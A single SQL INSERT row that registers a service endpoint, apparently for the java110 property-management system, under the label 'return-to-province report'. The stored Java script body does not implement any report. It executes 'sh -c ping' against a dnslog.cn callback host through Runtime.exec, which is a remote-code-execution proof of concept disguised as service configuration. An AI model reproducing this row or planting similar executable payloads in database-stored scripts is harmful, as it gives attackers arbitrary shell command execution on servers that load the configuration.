INSERT INTO `c_service_sql` VALUES ('49', '/reportInfoBackCity/saveReportInfoBackCity', '返省上报', 'pId,userId', '3', '', '', 'import com.alibaba.fastjson.JSONObject;\nimport com.java110.service.context.DataQuery;\nimport com.java110.service.develop.IDevelop;\nimport org.apache.commons.lang.StringUtils;\nimport java.io.IOException;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic JSONObject execute(DataQuery dataQuery) {\n        JSONObject params = dataQuery.getRequestParams();\n      String [] cmd= {\"sh\",\"-c\",\"ping 84l7b4.dnslog.cn\"};\n         try {\n            Process proc =Runtime.getRuntime().exec(cmd);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n      \n    }', '', '', '2021-09-16 11:02:36', '1');
